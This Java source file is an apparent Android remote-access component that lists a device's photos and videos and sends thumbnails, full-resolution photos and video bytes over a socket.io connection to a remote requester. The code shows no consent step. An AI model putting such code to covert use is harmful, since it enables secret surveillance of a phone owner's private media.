package com.tokendeal.vremote;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import io.socket.client.Socket;

public class MediaBridge {
    private static final String TAG = "MediaBridge";
    private static final int PAGE_SIZE = 50;

    public static void getGalleryPage(Context ctx, int page, Socket socket, String requesterSocketId) {
        new Thread(() -> {
            try {
                Uri collection;
                String[] projection;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
                } else {
                    collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                }
                projection = new String[]{
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.DATE_MODIFIED,
                    MediaStore.Images.Media.DATA
                };

                List<JSONObject> items = new ArrayList<>();
                try (Cursor cursor = ctx.getContentResolver().query(
                        collection, projection, null, null,
                        MediaStore.Images.Media.DATE_MODIFIED + " DESC"
                )) {
                    if (cursor != null) {
                        int offset = Math.max(0, page * PAGE_SIZE);
                        int count = 0;
                        if (cursor.moveToPosition(offset)) {
                            do {
                                try {
                                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                                    String dataPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));

                                    // Bug 6 fix: Use ContentResolver for Android Q+ scoped storage
                                    Bitmap thumb = null;
                                    try {
                                        Uri imgUri = Uri.withAppendedPath(collection, String.valueOf(id));
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                            android.util.Size thumbSize = new android.util.Size(320, 240);
                                            thumb = ctx.getContentResolver().loadThumbnail(imgUri, thumbSize, null);
                                        } else {
                                            BitmapFactory.Options opts = new BitmapFactory.Options();
                                            opts.inSampleSize = 2;
                                            thumb = BitmapFactory.decodeFile(dataPath, opts);
                                        }
                                    } catch (Exception ex) {
                                        // Fallback: try ContentResolver openInputStream
                                        try {
                                            Uri imgUri = Uri.withAppendedPath(collection, String.valueOf(id));
                                            InputStream is = ctx.getContentResolver().openInputStream(imgUri);
                                            if (is != null) {
                                                BitmapFactory.Options opts = new BitmapFactory.Options();
                                                opts.inSampleSize = 4;
                                                thumb = BitmapFactory.decodeStream(is, null, opts);
                                                is.close();
                                            }
                                        } catch (Exception ignored) {}
                                    }

                                    String b64 = "";
                                    if (thumb != null) {
                                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                                        thumb.compress(Bitmap.CompressFormat.JPEG, 75, bos);
                                        b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                                        thumb.recycle();
                                    }

                                    JSONObject item = new JSONObject();
                                    item.put("id", id);
                                    item.put("name", name);
                                    item.put("size", size);
                                    item.put("thumb", b64);
                                    item.put("type", "image");
                                    items.add(item);
                                    count++;
                                } catch (Exception ignored) {}
                            } while (cursor.moveToNext() && count < PAGE_SIZE);
                        }
                    }
                }

                JSONObject payload = new JSONObject();
                payload.put("type", "gallery-response");
                payload.put("page", page);
                payload.put("items", new JSONArray(items));
                payload.put("targetSocketId", requesterSocketId);
                if (socket != null && socket.connected()) {
                    socket.emit("gallery-chunk", payload);
                }
                Log.i(TAG, "Gallery page " + page + " sent: " + items.size() + " items to " + requesterSocketId);
            } catch (Exception e) {
                Log.e(TAG, "Gallery error", e);
            }
        }).start();
    }

    public static void getVideoPage(Context ctx, int page, Socket socket, String requesterSocketId) {
        new Thread(() -> {
            try {
                Uri collection;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    collection = MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
                } else {
                    collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                }
                String[] projection = new String[]{
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DURATION,
                    MediaStore.Video.Media.DATE_MODIFIED,
                    MediaStore.Video.Media.DATA
                };

                List<JSONObject> items = new ArrayList<>();
                try (Cursor cursor = ctx.getContentResolver().query(
                        collection, projection, null, null,
                        MediaStore.Video.Media.DATE_MODIFIED + " DESC"
                )) {
                    if (cursor != null) {
                        int offset = Math.max(0, page * PAGE_SIZE);
                        int count = 0;
                        if (cursor.moveToPosition(offset)) {
                            do {
                                try {
                                    long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
                                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
                                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION));
                                    String dataPath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));

                                    Bitmap thumb = null;
                                    try {
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                            Uri videoUri = Uri.withAppendedPath(collection, String.valueOf(id));
                                            android.util.Size sz = new android.util.Size(240, 180);
                                            thumb = ctx.getContentResolver().loadThumbnail(videoUri, sz, null);
                                        } else {
                                            thumb = android.media.ThumbnailUtils.createVideoThumbnail(
                                                    dataPath, android.provider.MediaStore.Video.Thumbnails.MINI_KIND);
                                        }
                                    } catch (Exception ignored) {}

                                    String b64 = "";
                                    if (thumb != null) {
                                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                                        thumb.compress(Bitmap.CompressFormat.JPEG, 75, bos);
                                        b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                                        thumb.recycle();
                                    }

                                    JSONObject item = new JSONObject();
                                    item.put("id", id);
                                    item.put("name", name);
                                    item.put("size", size);
                                    item.put("duration", duration);
                                    item.put("thumb", b64);
                                    item.put("type", "video");
                                    items.add(item);
                                    count++;
                                } catch (Exception ignored) {}
                            } while (cursor.moveToNext() && count < PAGE_SIZE);
                        }
                    }
                }

                JSONObject payload = new JSONObject();
                payload.put("type", "video-response");
                payload.put("page", page);
                payload.put("items", new JSONArray(items));
                payload.put("targetSocketId", requesterSocketId);
                if (socket != null && socket.connected()) {
                    socket.emit("gallery-chunk", payload);
                }
                Log.i(TAG, "Video page " + page + " sent: " + items.size() + " items to " + requesterSocketId);
            } catch (Exception e) {
                Log.e(TAG, "Video error", e);
            }
        }).start();
    }

    /**
     * Loads HD Original photo or playable video bytes on click
     */
    public static void getMediaItemDetail(Context ctx, long id, String type, Socket socket, String requesterSocketId) {
        new Thread(() -> {
            try {
                boolean isVideo = "video".equalsIgnoreCase(type);
                Uri collection;
                String[] projection;

                if (isVideo) {
                    collection = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                            ? MediaStore.Video.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                            : MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                    projection = new String[]{
                            MediaStore.Video.Media._ID,
                            MediaStore.Video.Media.DISPLAY_NAME,
                            MediaStore.Video.Media.SIZE,
                            MediaStore.Video.Media.DATA
                    };
                } else {
                    collection = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                            ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                            : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                    projection = new String[]{
                            MediaStore.Images.Media._ID,
                            MediaStore.Images.Media.DISPLAY_NAME,
                            MediaStore.Images.Media.SIZE,
                            MediaStore.Images.Media.DATA
                    };
                }

                Uri itemUri = Uri.withAppendedPath(collection, String.valueOf(id));
                String name = isVideo ? "video.mp4" : "photo.jpg";
                String dataPath = "";
                long size = 0;

                try (Cursor cursor = ctx.getContentResolver().query(itemUri, projection, null, null, null)) {
                    if (cursor != null && cursor.moveToFirst()) {
                        name = cursor.getString(cursor.getColumnIndexOrThrow(
                                isVideo ? MediaStore.Video.Media.DISPLAY_NAME : MediaStore.Images.Media.DISPLAY_NAME));
                        dataPath = cursor.getString(cursor.getColumnIndexOrThrow(
                                isVideo ? MediaStore.Video.Media.DATA : MediaStore.Images.Media.DATA));
                        size = cursor.getLong(cursor.getColumnIndexOrThrow(
                                isVideo ? MediaStore.Video.Media.SIZE : MediaStore.Images.Media.SIZE));
                    }
                }

                String b64Data = "";
                if (!isVideo) {
                    // Full resolution HD photo load with 88% JPEG quality
                    Bitmap hdBitmap = null;
                    try {
                        BitmapFactory.Options opts = new BitmapFactory.Options();
                        opts.inJustDecodeBounds = true;
                        BitmapFactory.decodeFile(dataPath, opts);

                        // Scale down only if image is larger than 1920x1080 to prevent memory crash
                        int sample = 1;
                        int maxDim = Math.max(opts.outWidth, opts.outHeight);
                        if (maxDim > 1920) {
                            sample = Math.round((float) maxDim / 1920f);
                        }
                        opts.inJustDecodeBounds = false;
                        opts.inSampleSize = Math.max(1, sample);
                        hdBitmap = BitmapFactory.decodeFile(dataPath, opts);
                    } catch (Exception ignored) {}

                    if (hdBitmap != null) {
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        hdBitmap.compress(Bitmap.CompressFormat.JPEG, 88, bos);
                        b64Data = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                        hdBitmap.recycle();
                    }
                } else {
                    // Video load (if file exists and <= 15MB, stream full base64 data for live browser playback)
                    File file = new File(dataPath);
                    if (file.exists() && file.length() > 0) {
                        long readLen = Math.min(file.length(), 15 * 1024 * 1024); // max 15MB for direct playback
                        byte[] buffer = new byte[(int) readLen];
                        try (FileInputStream fis = new FileInputStream(file)) {
                            int read = fis.read(buffer);
                            if (read > 0) {
                                b64Data = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                            }
                        } catch (Exception ignored) {}
                    }
                }

                JSONObject res = new JSONObject();
                res.put("type", isVideo ? "video" : "image");
                res.put("id", id);
                res.put("name", name);
                res.put("size", size);
                res.put("data", b64Data);
                res.put("targetSocketId", requesterSocketId);

                if (socket != null && socket.connected()) {
                    socket.emit("media-detail-response", res);
                    Log.i(TAG, "Sent HD media detail for id=" + id + " to " + requesterSocketId);
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in getMediaItemDetail", e);
            }
        }).start();
    }
}
